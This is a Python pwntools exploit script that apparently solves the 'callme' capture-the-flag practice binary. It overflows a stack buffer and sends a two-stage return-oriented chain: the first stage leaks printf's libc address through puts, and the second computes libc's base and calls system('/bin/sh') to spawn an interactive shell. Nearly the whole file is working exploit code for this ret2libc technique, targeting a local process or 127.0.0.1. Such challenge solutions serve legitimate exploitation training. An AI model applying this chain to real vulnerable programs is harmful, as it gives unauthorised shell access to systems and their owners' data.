#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./callme')
context.bits = 64

libc = elf.libc
rop = ROP(elf)

gs = '''
set disable-randomization off
b pwnme
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

def info(printf_libc, libc_base, system, bin_sh):
    log.info("printf@libc:  0x%x" % printf_libc)
    log.success("leaked libc: 0x%x" % libc_base)
    log.info("system@libc: 0x%x" % system)
    log.info("binsh@libc:  0x%x" % bin_sh)

def create_stage(pop_rdi, func, ret, arg):
    chain =  b"A"*32
    chain += b"B"*8
    chain += p64(pop_rdi) # pop rdi; ret
    chain += p64(arg)
    chain += p64(func)
    if ret is not None: chain += p64(ret)

    return chain

def exploit():
    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    puts_plt  = elf.plt["puts"]
    main_addr = elf.sym["main"]
    printf_got = elf.got["printf"]
    print(elf.got)
    
    # create stage1 to leak libc through printf
    stage1 =  create_stage(pop_rdi, puts_plt, main_addr, printf_got)
    r.sendlineafter('>', stage1)
    printf_libc = u64(r.recvuntil(b"\ncallme").split(b"\n")[1].ljust(8, b"\x00"))
    log.success('Stage 1 sent!')
    #print(p64(printf_libc))

    printf_ofset = libc.sym['printf'] # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fgets
    syst_offset = libc.sym['system'] # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
    bin_sh_ofst = next(libc.search(b"/bin/sh")) # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh ...or using pwntools: libc.search("/bin/sh").next()

    # calculate the actual addresses of the libc functions
    libc_base = printf_libc - printf_ofset
    system    = libc_base + syst_offset
    bin_sh    = libc_base + bin_sh_ofst

    # print out info leaked...
    info(printf_libc, libc_base, system, bin_sh)

    # create the rop chain for stage 2 to spawn a shell
    log.info('Sending stage 2...')
    stage2 = create_stage(pop_rdi, system, None, bin_sh)
    #print(stage2)
    r.sendlineafter('>', stage2)

    #============= interactive ================
    
    r.interactive()

if __name__ == '__main__':
    exploit()